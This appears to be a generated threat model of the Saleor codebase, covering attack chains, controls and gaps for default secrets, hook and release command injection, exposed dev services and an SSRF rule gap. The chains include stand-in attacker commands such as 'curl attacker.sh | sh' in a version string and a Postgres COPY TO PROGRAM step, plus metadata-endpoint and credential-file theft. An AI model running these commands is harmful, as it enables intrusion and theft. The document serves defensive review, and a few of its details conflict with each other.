failures.failure_mode: Default SECRET_KEY 'changeme' enables JWT forgery and full auth bypass in any deployment that doesn't rotate it
attack_chain: Attacker reads public repo .devcontainer/backend.env and extracts SECRET_KEY=changeme
Attacker identifies a Saleor deployment (staging/prod) that copied the dev env file or .env.example without rotating SECRET_KEY
Attacker forges a JWT signed with HS256 and key 'changeme' containing {user_id: <superuser_pk>, is_staff: true, is_superuser: true, exp: <future>}
Attacker sends the forged token as Authorization: JWT <token> to the GraphQL endpoint /graphql/
Saleor's JWT middleware validates the signature against settings.SECRET_KEY ('changeme'), accepts the token, and authenticates the attacker as the superuser
Attacker queries all customer PII, modifies orders/payments, creates malicious apps with full permissions, and exfiltrates data
failures.business_impact: Complete platform compromise — all customer PII (names, addresses, emails, order history), payment transaction records, and gift card balances are exposed. Attackers can modify orders, issue refunds, and install persistent malicious apps. Every merchant running a deployment with the default key is affected.
failures.blast_radius: All tenants/sites on the affected deployment; all customer and order data; full admin API access; ability to pivot to connected payment gateways and webhook endpoints. Persists until the key is rotated AND all existing tokens are invalidated.
failures.trigger: Any Saleor deployment where SECRET_KEY was not changed from the shipped default 'changeme' (e.g., operator ran 'cp .env.example .env' per CONTRIBUTING.md and deployed, or copied .devcontainer/backend.env to production). Attacker forges a token offline — no server interaction needed until the forged token is presented.
failures.evidence: .devcontainer/backend.env: 'SECRET_KEY=changeme'; saleor/settings.py consumes SECRET_KEY for JWT signing (pyjwt>=2.15.0 pinned in pyproject.toml); CONTRIBUTING.md instructs 'cp .env.example .env' which propagates the default

failures.failure_mode: Pre-commit local hooks execute manage.py (full app import) on developer machines during git commit — malicious PR code runs with reviewer's credentials
attack_chain: Attacker opens a PR that adds module-level code execution to any file imported by saleor.settings or manage.py (e.g., a migration file, a settings conditional, or an app's __init__.py)
Reviewer checks out the PR branch locally to review/test (standard workflow per saleor-commit skill)
Reviewer runs 'git commit' on any change — pre-commit fires
The local pre-commit hooks 'migrations-check' and 'gql-schema-check' execute './manage.py makemigrations --check --dry-run' and './manage.py get_graphql_schema'
manage.py imports saleor.settings → Django app loading imports all app modules including the attacker's tampered file → arbitrary Python code executes
Attacker's code runs with the reviewer's privileges: reads ~/.ssh keys, ~/.aws/credentials, GH_TOKEN env vars, .env files, and exfiltrates them or installs a persistent hook
failures.business_impact: Developer machine compromise → theft of SSH keys, cloud credentials (AWS/GCP/Azure), GitHub tokens with repo write access, and local secrets. Lateral movement into CI/CD pipelines, production infrastructure, and all repositories the developer can access.
failures.blast_radius: The reviewer's entire machine and all credentials accessible to their user account; from there, any connected system (GitHub org, cloud accounts, VPN, internal services). Multiple reviewers = multiple compromised machines.
failures.trigger: Reviewer runs 'git commit' on a branch containing a PR with code that executes at import time. The pre-commit local hooks invoke manage.py which triggers the import chain. Fires on every commit, not just commits touching the malicious file.
failures.evidence: .pre-commit-config.yaml local hooks: 'entry: sh -c "./manage.py makemigrations --check --dry-run"' and 'entry: sh -c "./manage.py get_graphql_schema | diff saleor/graphql/schema.graphql -"'; .claude/skills/saleor-commit/SKILL.md step 5 'Run git commit'; manage.py sets DJANGO_SETTINGS_MODULE=saleor.settings and calls execute_from_command_line

failures.failure_mode: release-it hooks interpolate pyproject.toml version into shell commands — command injection during release gives attacker the maintainer's GitHub token and push access
attack_chain: Attacker opens a PR modifying pyproject.toml [project] version to a string containing shell metacharacters, e.g. '3.24.0-a.0$(curl attacker.sh|sh)' or '3.24.0; curl attacker.sh | sh'
PR is merged (version string changes are rarely scrutinized in review)
Maintainer runs 'npm run release' (package.json: 'release': 'release-it') to cut a release
release-it reads the version from pyproject.toml via @release-it/bumper, then executes hooks: 'git checkout -B release-${version} --track' and 'gh pr create --title "Release ${version}" ...'
The ${version} variable is interpolated into shell commands — the attacker's metacharacters execute arbitrary shell commands in the maintainer's release environment
Injected command reads the GH_TOKEN / GITHUB_TOKEN environment variable, exfiltrates it, and uses 'gh' or 'git push' to push a malicious commit or create a malicious release as the maintainer
failures.business_impact: Full repository and release pipeline compromise — attacker can push arbitrary code to saleor/saleor, create releases that distribute malware to all downstream users (Docker images, PyPI package), and access the maintainer's GitHub account. Supply chain attack affecting every Saleor deployment that pulls the malicious release.
failures.blast_radius: The saleor/saleor GitHub repository, the PyPI 'saleor' package, Docker Hub 'saleor/saleor' images, and every downstream deployment that auto-updates. Potentially thousands of production e-commerce platforms.
failures.trigger: Maintainer runs 'npm run release' on a branch where pyproject.toml version contains shell metacharacters. The release-it hooks interpolate ${version} into sh -c commands without quoting or sanitization.
failures.evidence: .release-it.json hooks: 'after:bump': ['uv lock --refresh-package saleor', 'git checkout -B release-${version} --track'], 'after:release': ['git push origin release-${version}', 'gh pr create --base `cat .base_ver_release.txt` --head release-${version} --title "Release ${version}" ...']; package.json: '"release": "release-it"'; pyproject.toml: 'version = "3.24.0-a.0"'

failures.failure_mode: Devcontainer exposes Postgres superuser and Valkey on host ports with hardcoded credentials — any local process gets full DB access
attack_chain: Developer runs 'docker compose up' per CONTRIBUTING.md — db service binds host port 5432, cache binds 6379
Postgres container starts with POSTGRES_USER=saleor / POSTGRES_PASSWORD=saleor — in the official postgres image, POSTGRES_USER is the database SUPERUSER

Any process on the developer's machine (malware, a malicious npm postinstall script, another user on a shared machine, or a container on the default Docker bridge network) connects to localhost:5432 with saleor:saleor
Attacker authenticates as Postgres superuser and reads/writes all data: customer PII, order records, JWT signing keys if stored, app tokens

As Postgres superuser, attacker uses 'COPY (SELECT ...) TO PROGRAM "curl attacker.sh | sh"' to execute arbitrary shell commands inside the db container, or uses the pg_read_file/pg_ls_dir functions to read files

Attacker pivots: reads the saleor container's environment (via /proc on shared host or docker socket if mounted), extracts SECRET_KEY and DATABASE_URL, and connects to Valkey on 6379 (no auth) to poison cache entries or hijack sessions
failures.business_impact: Full database compromise on the developer's machine — all local dev data exposed, container escape via Postgres COPY TO PROGRAM, and theft of any secrets accessible from the dev environment. On shared dev machines or CI runners, one compromised job can attack all co-located stacks.
failures.blast_radius: The developer's entire Docker environment (all containers on the default bridge network can reach the exposed ports), the host machine (via container escape techniques), and any secrets in the dev environment. In CI, all jobs sharing the runner.
failures.trigger: Developer runs 'docker compose up db cache' (per CONTRIBUTING.md) or the devcontainer starts (devcontainer.json forwardPorts includes db:5432, cache:6379). Ports 5432 and 6379 become reachable on the host with known credentials saleor:saleor and no Valkey auth.
failures.evidence: .devcontainer/docker-compose.yml: db service 'ports: - 5432:5432', 'environment: POSTGRES_USER=saleor / POSTGRES_PASSWORD=saleor'; cache service 'ports: - 6379:6379' (Valkey with no requirepass); .devcontainer/devcontainer.json 'forwardPorts': [8000, 'dashboard:9000', 'mailpit:8025', 'db:5432', 'cache:6379']; .worktree-container/docker-compose.yml same pattern

failures.failure_mode: filter-benchmark skill uploads full SQL query plans (with embedded data literals) to public third-party service explain.dalibo.com
attack_chain: Developer follows the filter-benchmark skill to benchmark a filter on a staging or production-like database (skill instructs running in Django shell: 'source .venv/bin/activate && python manage.py shell')
Developer calls analyze(filtered_qs, 'customer lookup') — the analyze() function captures sql, params = qs.query.sql_with_params()
The queryset's SQL contains literal values from the database: WHERE email = 'real-customer@example.com', WHERE id IN (12345, 67890), or complex filter logic revealing business rules

analyze() calls _upload_to_dalibo(plan_default, title) which POSTs the full EXPLAIN ANALYZE JSON plan (including the SQL text, table schemas, column names, row counts) to https://explain.dalibo.com/new
explain.dalibo.com returns a public URL; the skill prints it and includes it in the markdown report() output
The URL is shared in PRs, Slack, tickets, or documentation — anyone with the link can view the query plan containing PII literals and proprietary schema/business logic indefinitely
failures.business_impact: PII leakage (customer emails, IDs, order values embedded in query literals) to a third-party service outside organizational control; disclosure of internal database schema, table/column names, and business logic embedded in complex filters. Compliance violation (GDPR/CCPA) if real customer data is included.
failures.blast_radius: The specific data embedded in the analyzed query (potentially thousands of customer records if the filter matches broadly); the Dalibo paste is public and permanent; the URL propagates through PRs, chat, and documentation, multiplying exposure.
failures.trigger: Developer runs analyze(qs, title) with default upload=True in a Django shell connected to a database containing real or realistic data. The upload happens automatically — no explicit consent or redaction step.
failures.evidence: .claude/skills/filter-benchmark/analyze_query.py: '_upload_to_dalibo()' uses 'urllib.request.urlopen(req, timeout=10)' to 'https://explain.dalibo.com/new'; 'analyze(qs, title, *, upload: bool = True)' default uploads; 'sql, params = qs.query.sql_with_params()' captured before upload; SKILL.md Step 5 instructs running in Django shell against the project database

failures.failure_mode: populatedb creates superuser admin@example.com/admin with documented credentials — internet-exposed dev/staging instances are trivially compromised
attack_chain: Operator or CI pipeline runs 'python manage.py populatedb --createsuperuser' (pyproject.toml poe task) to set up a dev/staging environment
populatedb creates a superuser with email admin@example.com and password 'admin' — these credentials are publicly documented in CONTRIBUTING.md
The Saleor API is started on port 8000 (uvicorn saleor.asgi:application) and the instance is reachable (devcontainer forwardPorts, cloud staging URL, or misconfigured ALLOWED_HOSTS)
Attacker reads CONTRIBUTING.md in the public repo, learns admin@example.com / admin
Attacker calls the tokenCreate GraphQL mutation with {email: 'admin@example.com', password: 'admin'} and receives a valid superuser JWT
Attacker has full admin access: reads all customer data, modifies products/orders, accesses payment configurations, installs apps, and can pivot to connected systems via webhook configurations
failures.business_impact: Complete compromise of any Saleor instance running with populatedb sample data and a reachable API. If staging environments sync from production data, real customer PII is exposed. Attackers can use the instance as a pivot to attack connected payment gateways, email services, and webhook endpoints.
failures.blast_radius: The entire Saleor instance and all data it contains; connected external systems (payment PSPs, SMTP, webhook consumers, S3 buckets) whose credentials are stored in the instance; if the instance is a staging environment with production-like data, the blast radius includes GDPR-reportable PII exposure.
failures.trigger: Any Saleor instance created with 'populatedb --createsuperuser' (the documented setup command) that is network-reachable. Attacker authenticates with the publicly documented admin@example.com / admin credentials via the tokenCreate mutation.
failures.evidence: CONTRIBUTING.md: 'populatedb populates database with example data and creates an admin account for admin@example.com with the password set to admin'; pyproject.toml: 'populatedb.cmd = "python manage.py populatedb --createsuperuser"'; .devcontainer/devcontainer.json: '"postCreateCommand": "python manage.py migrate"' and forwardPorts includes 8000; .devcontainer/backend.env: 'ALLOWED_HOSTS="localhost,127.0.0.1,host.docker.internal,host.containers.internal"'

failures.failure_mode: Semgrep no-requests-lib rule only blocks requests.* — urllib.request/http.client bypass the SSRF wrapper entirely, giving a false sense of SSRF coverage
attack_chain: Security team relies on .semgrep/security/requests/no-use-requests-lib.yaml to enforce that all outbound HTTP goes through HTTPClient.send_request (the SSRF protection wrapper)
The rule patterns only match requests.get/post/put/delete/head/patch/request and requests.Session() methods — urllib.request, http.client, httpx, aiohttp, and raw socket calls are not covered
The project's own code demonstrates the bypass: .claude/skills/filter-benchmark/analyze_query.py uses urllib.request.urlopen() for outbound HTTP, passing semgrep cleanly

A malicious Saleor App (installed via the App system, which runs Python code in-process) or a vulnerability in request-handling code uses urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/') to reach the cloud metadata endpoint
The SSRF protections in HTTPClient.send_request (IP allowlisting, scheme restrictions, redirect limits) are never invoked because the code path uses urllib directly
Attacker reads cloud IAM credentials from the metadata service, uses them to access S3 buckets (product images, backups), read secrets from AWS Secrets Manager, or pivot to other internal services
failures.business_impact: SSRF leading to cloud metadata credential theft and full infrastructure compromise. The semgrep rule creates a false sense of security — developers and reviewers believe all HTTP is wrapped, but the wrapper is trivially bypassed. Any app or code path using urllib/http.client has unrestricted network access.
failures.blast_radius: Cloud metadata credentials → all AWS/GCP/Azure resources accessible to the instance's IAM role (S3, Secrets Manager, databases, other services); internal network services reachable from the pod; the Valkey and Postgres ports on the internal network. Scales to the full cloud account if the IAM role is over-permissioned.
failures.trigger: Any code path (especially app/extension code running in-process, or a request handler tricked into making an outbound call with attacker-influenced URL) uses urllib.request.urlopen, http.client, or httpx instead of HTTPClient.send_request. Semgrep passes; SSRF protections are bypassed.
failures.evidence: .semgrep/security/requests/no-use-requests-lib.yaml: patterns only cover 'requests.request/get/post/put/delete/head/patch' and 'requests.Session()'; .claude/skills/filter-benchmark/analyze_query.py: 'urllib.request.urlopen(req, timeout=10)' — live bypass in the codebase; system cartography: 'External HTTP client (HTTPClient.send_request) — SSRF protection wrapper; bypass = SSRF (enforced by semgrep rule no-requests-lib)'

controls.failure_mode: Default SECRET_KEY 'changeme' enables JWT forgery and full auth bypass in any deployment that doesn't rotate it

controls.shipped_default: SECRET_KEY=changeme is present only in .devcontainer/backend.env, a development-only file not referenced by production deployment paths.
controls.documentation: CONTRIBUTING.md instructs copying .env.example to .env but does not explicitly warn that SECRET_KEY must be rotated before any non-local deployment.
controls.runtime_guard: No startup check or warning exists in the codebase that detects a known-default or weak SECRET_KEY at boot.
controls.token_design: JWTs are signed with SECRET_KEY via pyjwt; forging a token with the known key yields full authentication as any user including staff.

gaps: No fail-fast startup validation rejecting obviously default/weak SECRET_KEY values in non-development settings.
No documentation warning that SECRET_KEY must be changed before deployment; .env.example guidance is implicit at best.
No key-rotation runbook or token-invalidation mechanism documented for the case where the default leaks.
Devcontainer default 'changeme' is trivially copy-pasted into staging/production by operators following quick-start docs.

controls.failure_mode: Pre-commit local hooks execute manage.py (full app import) on developer machines during git commit — malicious PR code runs with reviewer's credentials

controls.hook_scope: migrations-check and gql-schema-check are local hooks that run ./manage.py commands, which import the full Django app and therefore all project code on every commit touching models.py or schema-relevant files.
controls.freeze_policy: Remote hooks (ruff, mypy, semgrep, deptry, uv-lock) are pinned to frozen commit SHAs, limiting supply-chain drift for those tools.
controls.exclusion: The pre-commit config excludes .semgrep and vendored directories from scanning, but does not isolate local hooks from arbitrary project code execution.

gaps: Local hooks execute unreviewed working-tree code (manage.py import chain) with the developer's full user privileges on every commit.
No sandboxing, containerization, or reduced-privilege execution for the local manage.py hooks.
No guidance in CONTRIBUTING.md warning reviewers that committing untrusted branches executes project code locally.
migrations-check fires on any models.py change, so a malicious models.py (or any module it imports) runs at commit time before review.

controls.failure_mode: release-it hooks interpolate pyproject.toml version into shell commands — command injection during release gives attacker the maintainer's GitHub token and push access

controls.version_source: The version comes from pyproject.toml [project].version, which is maintainer-controlled in the repo, not from external input at release time.
controls.hook_commands: after:bump runs 'uv lock --refresh-package saleor' and 'git checkout -B release-${version}'; after:release runs gh pr create with --base from a file written by before:bump.
controls.release_gating: release-it is configured with git.tag=false, github.release=false, npm.publish=false, so the npm script only performs local bump + branch + PR creation; publishing happens through the created PR.
controls.pr_protection: The release PR is created with --label release and assigned to the maintainer, meaning a human reviews the branch before merge.

gaps: ${version} is interpolated unquoted into shell commands (git checkout -B release-${version}, gh pr create --title "Release ${version}"); a version string containing shell metacharacters executes arbitrary commands with the maintainer's gh credentials.
before:bump writes the base branch name to a file that after:release later interpolates into gh pr create --base without sanitization.
No validation that project.version matches a strict semver pattern before it is used in shell commands.
The injected commands run in after:bump/after:release hooks where GH_TOKEN and git push credentials are in scope.

controls.failure_mode: Devcontainer exposes Postgres superuser and Valkey on host ports with hardcoded credentials — any local process gets full DB access

controls.dev_only_context: The exposed ports and credentials live in .devcontainer/docker-compose.yml and devcontainer.json, which are development-environment files, not production deployment artifacts.
controls.credentials: Postgres is created with POSTGRES_USER=saleor / POSTGRES_PASSWORD=saleor, a superuser with hardcoded credentials, published on host port 5432.
controls.cache: Valkey runs with no authentication and is published on host port 6379.
controls.worktree_isolation: .worktree-container/docker-compose.yml deliberately removes host port bindings (ephemeral ports only) for multi-worktree setups, showing awareness of port-collision risk, but the primary .devcontainer still binds fixed host ports.
controls.network: Containers share the default compose bridge network; any other container or local process that can reach the host ports gets full DB access.

gaps: Postgres superuser credentials are hardcoded and published to a fixed host port; any local process or malicious container can connect and read/modify all data.
Valkey has no authentication and is exposed on the host, allowing cache poisoning of any key the app reads.
ALLOWED_HOSTS in backend.env includes host.docker.internal and host.containers.internal, widening what the dev app will accept.
No documentation warning that these ports must never be exposed beyond localhost or used outside development.
The devcontainer forwards db:5432 and cache:6379 to the host by default, so merely opening the project in a devcontainer exposes the services.

controls.failure_mode: filter-benchmark skill uploads full SQL query plans (with embedded data literals) to public third-party service explain.dalibo.com

controls.opt_out_flag: analyze() accepts upload: bool = True, so a developer can pass upload=False to skip the Dalibo upload.
controls.error_handling: Upload failures are caught and only printed as a warning; analysis continues locally.
controls.local_artifacts: Plans are also saved locally to /tmp as JSON, so the Dalibo upload is not the only output path.
controls.intended_use: The skill is documented for benchmarking filters on generated bulk test data (100k+ synthetic rows), not production data.

gaps: Upload defaults to True with no explicit consent prompt, redaction step, or confirmation before sending data to a public third-party paste service.

EXPLAIN ANALYZE plans embed literal parameter values from the queryset (filter inputs, and potentially row data via verbose output), which can include real customer data if run against a non-synthetic database.
Dalibo pastes are public and permanent; the returned URL propagates into reports, PRs, and chat, multiplying exposure with no expiry or deletion mechanism.
No guard preventing the skill from being run against a production or staging database connection; nothing checks which DATABASE_URL the shell is using.
The skill instructions actively encourage running it in a Django shell with only a venv activation step, with no environment check.

controls.failure_mode: populatedb creates superuser admin@example.com/admin with documented credentials — internet-exposed dev/staging instances are trivially compromised

controls.documented_default: CONTRIBUTING.md and the poe task help text explicitly document that populatedb creates admin@example.com with password admin.
controls.dev_command: populatedb is a development-only management command (manage.py populatedb --createsuperuser) intended for local sample data.
controls.settings_gating: AGENTS.md restricts saleor.core.development.* modules to populatedb and tests, indicating populatedb is treated as a development-only path.
controls.createsuperuser: The createsuperuser command supports DJANGO_SUPERUSER_PASSWORD env var and interactive password entry, so the fixed credential is specific to populatedb's --createsuperuser flag.

gaps: The superuser credential admin@example.com/admin is publicly documented in the repo README/CONTRIBUTING, so any network-reachable instance created with populatedb is trivially compromised via tokenCreate.
No runtime guard or startup warning when populatedb-created credentials are used on a non-local ALLOWED_HOSTS configuration.
No forced password change on first login for the populatedb superuser.
No documentation warning that populatedb must never be run on staging/production or any network-reachable environment.
The devcontainer's ALLOWED_HOSTS includes broad hostnames, making it easy to expose a populatedb-seeded instance accidentally.

controls.failure_mode: Semgrep no-requests-lib rule only blocks requests.* — urllib.request/http.client bypass the SSRF wrapper entirely, giving a false sense of SSRF coverage

controls.primary_rule: The no-requests-lib Semgrep rule (severity ERROR) blocks requests.get/post/put/delete/head/patch/request and Session-based calls, with an autofix rewriting to HTTPClient.send_request.
controls.wrapper_exists: The rule message references an HTTPClient.send_request(...) wrapper intended to centralize SSRF protections (timeouts, redirect policy, allowlists).
controls.related_coverage: analyze_query.py in the filter-benchmark skill itself uses urllib.request.urlopen to upload plans to explain.dalibo.com, demonstrating that urllib is used in-repo outside the guarded pattern.
controls.pytest_socket: Tests run with --disable-socket (pytest-socket) by default, so test suites catch unexpected outbound network calls regardless of library.

gaps: No Semgrep rule blocks urllib.request.urlopen/urlretrieve, http.client, httpx, aiohttp, or raw socket outbound calls, so the SSRF wrapper is trivially bypassed.
The rule's fix-regex and patterns are scoped to the requests library only; coverage does not extend to Python stdlib HTTP clients.
No defense-in-depth control (e.g., egress allowlist, DNS/IP validation at the wrapper level documented as mandatory) that would catch stdlib-based calls.
In-repo code (analyze_query.py) already uses urllib.request.urlopen, showing the gap is not merely theoretical.

explanations.failure_mode: Default SECRET_KEY 'changeme' enables JWT forgery and full auth bypass in any deployment that doesn't rotate it
explanations.scenario_summary: A publicly known default signing key lets any attacker forge superuser JWTs offline and fully compromise any Saleor deployment that failed to rotate SECRET_KEY.
explanations.code_connection: The shipped dev environment files (.devcontainer/backend.env, .env.example) contain SECRET_KEY=changeme, and Saleor's JWT middleware validates tokens against settings.SECRET_KEY with no startup check that the key was changed from the default.
explanations.links_to_other_scenarios: This is the authentication-bypass primitive that amplifies every other scenario — the populatedb admin account, exposed dev Postgres, and leaked query plans all become remotely exploitable at scale once an attacker can forge a superuser token; it also pairs with the release-it command injection, since a forged token plus a malicious release yields full supply-chain compromise.

explanations.failure_mode: Pre-commit local hooks execute manage.py (full app import) on developer machines during git commit — malicious PR code runs with reviewer's credentials
explanations.scenario_summary: Local pre-commit hooks that invoke manage.py cause arbitrary PR code to execute with the reviewer's full local privileges on every commit, turning code review into a code-execution vector.
explanations.code_connection: The pre-commit hooks 'migrations-check' and 'gql-schema-check' run './manage.py makemigrations --check --dry-run' and './manage.py get_graphql_schema', and manage.py imports saleor.settings, which triggers Django app loading and import-time execution of any tampered module in the PR branch.
explanations.links_to_other_scenarios: This is the developer-machine entry point that chains into the SECRET_KEY scenario (stolen .env secrets enable JWT forgery in deployed environments) and into the devcontainer exposure (stolen credentials plus host-port databases enable lateral movement); it shares the same root cause as the release-it injection — untrusted input flowing into shell/process execution without sanitization.

explanations.failure_mode: release-it hooks interpolate pyproject.toml version into shell commands — command injection during release gives attacker the maintainer's GitHub token and push access
explanations.scenario_summary: Shell metacharacters in the pyproject.toml version string are interpolated unquoted into release-it hook commands, allowing a merged PR to execute arbitrary commands in the maintainer's release environment.
explanations.code_connection: The release-it configuration runs hooks like 'git checkout -B release-${version} --track' and 'gh pr create --title "Release ${version}"' where ${version} is read from pyproject.toml by @release-it/bumper and passed to sh -c without quoting or sanitization.
explanations.links_to_other_scenarios: This is the maintainer-machine counterpart to the pre-commit manage.py execution — both are untrusted-repo-content-to-shell-command injection — and it directly enables supply-chain compromise that compounds the SECRET_KEY scenario, since a malicious release distributes backdoored artifacts to every deployment that then runs with a known signing key.

explanations.failure_mode: Devcontainer exposes Postgres superuser and Valkey on host ports with hardcoded credentials — any local process gets full DB access
explanations.scenario_summary: The dev stack binds Postgres (with superuser saleor:saleor) and unauthenticated Valkey to host ports 5432/6379, so any local process or co-located container gets full database access and container-level code execution.
explanations.code_connection: The docker-compose/devcontainer configuration sets POSTGRES_USER=saleor / POSTGRES_PASSWORD=saleor (superuser in the official postgres image), publishes db:5432 and cache:6379 to the host, and runs Valkey with no auth, enabling COPY TO PROGRAM command execution as the Postgres superuser.
explanations.links_to_other_scenarios: This is the local-network pivot that feeds the SECRET_KEY scenario (the db container's environment and any stored secrets are readable, and cache poisoning on unauthenticated Valkey can hijack sessions), and it is the same class of exposure as the populatedb default admin — documented, hardcoded credentials on a reachable service.

explanations.failure_mode: filter-benchmark skill uploads full SQL query plans (with embedded data literals) to public third-party service explain.dalibo.com
explanations.scenario_summary: The analyze_query.py helper automatically POSTs full EXPLAIN ANALYZE plans — including SQL text with real data literals, schema, and row counts — to a public third-party URL that is then shared in reports, leaking PII and internal schema.
explanations.code_connection: In .claude/skills/filter-benchmark/analyze_query.py, analyze() captures the queryset's SQL and parameters and calls _upload_to_dalibo(plan, title), which POSTs the plan JSON to https://explain.dalibo.com/new with no redaction, consent gate, or opt-out, and report() embeds the resulting public URL in markdown output.
explanations.links_to_other_scenarios: This scenario is directly enabled by the Semgrep gap — analyze_query.py's use of urllib.request.urlopen() is exactly the outbound-HTTP pattern the no-requests-lib rule fails to flag, so the exfiltration channel passes the project's own security linting; the leaked plans also hand an attacker the schema and query patterns needed to craft targeted attacks against deployments compromised via the default SECRET_KEY.

explanations.failure_mode: populatedb creates superuser admin@example.com/admin with documented credentials — internet-exposed dev/staging instances are trivially compromised
explanations.scenario_summary: The documented setup command creates a superuser with publicly known credentials (admin@example.com / admin), so any network-reachable instance built this way is trivially fully compromised via the tokenCreate mutation.
explanations.code_connection: The populatedb management command (exposed as a pyproject.toml poe task) creates a superuser with the hardcoded, CONTRIBUTING.md-documented email admin@example.com and password 'admin', with no environment guard preventing this on reachable instances.
explanations.links_to_other_scenarios: This is the easiest initial-access path into the same full-compromise outcome as the SECRET_KEY JWT forgery — both yield a superuser token — and it chains with the devcontainer exposure (a staging instance built from the dev stack has both the default admin and the exposed superuser database), and with the release-it injection (a compromised staging instance can be used to push or test malicious releases).

explanations.failure_mode: Semgrep no-requests-lib rule only blocks requests.* — urllib.request/http.client bypass the SSRF wrapper entirely, giving a false sense of SSRF coverage
explanations.scenario_summary: The SSRF-enforcement semgrep rule matches only the requests library, so urllib.request, http.client, httpx, and raw sockets bypass the HTTPClient SSRF wrapper entirely, enabling cloud metadata credential theft from in-process app code.
explanations.code_connection: The rule .semgrep/security/requests/no-use-requests-lib.yaml patterns cover only requests.get/post/put/delete/head/patch/request and requests.Session(), while the project's own .claude/skills/filter-benchmark/analyze_query.py uses urllib.request.urlopen() for outbound HTTP and passes the rule, demonstrating the bypass in-repo.
explanations.links_to_other_scenarios: This validation gap is what lets the filter-benchmark exfiltration scenario slip past the project's own security tooling, and the resulting SSRF/metadata-credential theft directly enables the infrastructure-level compromise that the SECRET_KEY and devcontainer scenarios assume; it is the defensive-control counterpart to the two shell-injection scenarios, showing a pattern of security controls that look complete but cover only a subset of the attack surface.

scenario_linkage.cross_cutting_themes: The scenarios cluster around three systemic themes: (1) untrusted input reaching execution or network boundaries without sanitization — shell metacharacters in pyproject.toml versions interpolated into release-it hooks, PR code executed at import time via pre-commit's manage.py invocation, and uncovered HTTP libraries (urllib/http.client) bypassing the SSRF wrapper; (2) hardcoded, publicly documented secrets and credentials — SECRET_KEY=changeme enabling offline JWT forgery, admin@example.com/admin from populatedb, and saleor:saleor superuser credentials on host-exposed dev services — each of which converts a deployment or developer machine into a full-compromise target; and (3) sensitive data leaving organizational control — SQL query plans with embedded PII literals auto-uploaded to explain.dalibo.com, and developer/cloud credentials exfiltrated from compromised machines. These themes compound: the semgrep gap hides the exfiltration channel, the default secrets turn local or staging compromise into production auth bypass, and the injection vectors turn a merged PR or a release command into maintainer- and developer-machine compromise, ultimately enabling supply-chain attacks against every downstream Saleor deployment. Notably, none of the scenarios involve race conditions or concurrency abuse — the risks are all validation, secrets-management, and trust-boundary failures rather than timing attacks.

Payment/TransactionItem domain — money movement is the highest-stakes data; balance adjustments must be atomic (ADR-0004); TransactionItem tokens are capability identifiers; Order.transactionSummaries is a projection to avoid leaking sensitive TransactionItem fields (ADR-0010)

Gift card domain — bearer instruments with balance; assignment is opt-in restriction (ADR-0001, ADR-0002, ADR-0003); balance changes must be race-safe (ADR-0004); email identifiers visible with MANAGE_GIFT_CARD but full User requires MANAGE_USERS (ADR-0005)

Order domain — order lifecycle (draft → unconfirmed → unfulfilled → fulfilled → completed/cancelled); concurrent modifications can drop tax calculations; base_subtotal_amount/base_total_amount columns store pre-tax prices for promotion qualification; draftOrderComplete returns TAX_ERROR on concurrent modification
Checkout domain — cart state, pricing calculation, gift card application, discount application; checkout tokens grant unauthenticated access; checkout completion creates orders

Webhook delivery domain — deferred payloads reflect generation-time state not trigger-time state (ADR-0011); PENDING deliveries created in request, payload built in background task; replica lag handled by retry-with-backoff; IMMEDIATE opt-out per webhook; object deletion before task = FAILED delivery

MPTT tree domain (Category, MenuItem) — django-mptt nested sets; structural writes serialized by global transaction-scoped Postgres advisory lock (ADR-0009); row locks insufficient; lock keys are permanent registry; queryset/cascade deletes exempt

Migration domain — zero-downtime deployment requires backwards-compatible schema; field removal staged across 3 releases (add db_default → SeparateDatabaseAndState → drop column); indexes created CONCURRENTLY in atomic=False migrations; data migrations all-or-nothing with post_migrate signal; cross-branch ports keep filename identity + merge migrations

Authentication/Authorization domain — JWT tokens, app tokens, permission groups, PermissionsField on GraphQL types; authorization tests required for every new restricted field/mutation; storefront traffic blocking rejects all non-privileged requests including introspection and auth (ADR-0007)

Concurrency domain — horizontal scale-out across many pods; no in-process state as source of truth; F() expressions for atomic increments; select_for_update for read-modify-write; update_or_create for upserts; on_commit for task scheduling; never block request/worker threads

File storage domain — media files stored in S3/GCS/Azure/local; avatar deletion via post_delete signal; thumbnail generation at multiple sizes; file validation on upload (magic bytes, allowlist, size); untrusted download handling
Email domain — transactional emails via SMTP or email plugins; staff notifications via separate Admin emails plugin; Mailpit for dev; Sendgrid plugin removed in 3.24
Search domain — SearchVector/GIN indexes on products, users, categories; search_index_dirty flag triggers re-indexing via Celery Beat; data migration marks rows dirty when indexing logic changes

Plugin domain — plugin manager dispatches payment, tax, email, notification, webhook events; plugins are external processes (apps) or legacy in-process plugins; synchronous webhook events can modify responses

Pre-commit/CI domain — ruff (lint+format), mypy (type check), deptry (dependency check), semgrep (security/correctness), uv-lock (lockfile check), migrations-check (pending migrations), gql-schema-check (schema freshness); all must pass before merge

Release domain — release-it automates version bump (pyproject.toml + saleor/__init__.py), creates release branch, generates changelog, opens PR; version markers (ADDED_IN_*) must match actual release version

Dev container domain — Docker Compose stack with Postgres 15, Valkey 8.1, Mailpit, Dashboard 3.23; worktree-container variant provides per-worktree isolation with ephemeral ports; backend.env contains SECRET_KEY=changeme (dev only, must not leak to production)

failures.failure_mode: Default SECRET_KEY 'changeme' enables JWT forgery and full auth bypass in any deployment that doesn't rotate it
attack_chain: Attacker identifies a Saleor deployment that uses the default SECRET_KEY (e.g., copied from .devcontainer/backend.env or .env.example without rotation)
Attacker crafts a JWT with arbitrary claims (user_id, is_staff=true, is_superuser=true, app_id) signed with the known 'changeme' key
Attacker sends the forged JWT as Authorization: Bearer <token> to the GraphQL endpoint
saleor/graphql/middleware.py decodes and validates the JWT using settings.SECRET_KEY — signature check passes because the key matches
Attacker now operates as any user, staff member, or app with full permissions — complete auth bypass
failures.business_impact: Total compromise of the e-commerce platform: attacker can read all customer PII, modify orders, adjust gift card balances, change prices, exfiltrate payment data, and pivot to connected systems. All merchants who deploy without rotating SECRET_KEY are affected. Customers' personal data, payment details, and order history are exposed.
failures.blast_radius: Entire deployment — all tenants, all data, all integrations. The forged token grants superuser-level access across every API surface. Compromise extends to connected payment gateways, email systems, and cloud storage via app tokens and webhook secrets.
failures.trigger: Any Saleor instance running with SECRET_KEY=changeme (the value shipped in .devcontainer/backend.env and referenced in documentation). Attacker needs only the public GraphQL endpoint URL and knowledge of the default key.
failures.evidence: .devcontainer/backend.env line: SECRET_KEY=changeme. saleor/settings.py reads SECRET_KEY from environment with no validation that it was changed from default. saleor/graphql/jwt.py and saleor/core/jwt.py use settings.SECRET_KEY for JWT signing/verification. No startup check or warning exists for the default value.

